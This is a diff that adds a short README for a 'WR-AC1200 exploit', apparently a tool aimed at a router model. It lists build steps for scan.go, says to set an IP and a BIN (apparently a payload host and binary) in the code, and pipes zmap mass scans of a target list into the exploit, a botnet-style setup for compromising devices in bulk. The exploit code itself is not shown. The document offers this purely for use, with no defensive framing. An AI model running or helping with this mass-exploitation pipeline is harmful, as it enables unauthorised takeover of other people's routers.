@@ -1,0 +1,17 @@
+
+WR-AC1200 exploit
+
+
+- Installation -
+sudo apt install -y golang-go
+
+* Change 32. IP and 33. BIN in scan.go
+
+- Compiling -
+go build scan.go
+
+- Usage -
+zmap -p <port> -o- -q -w <list> | ./scan <port>
+
+- Example -
+zmap -p 81 -o- -q -w ua.zone | ./scan 81
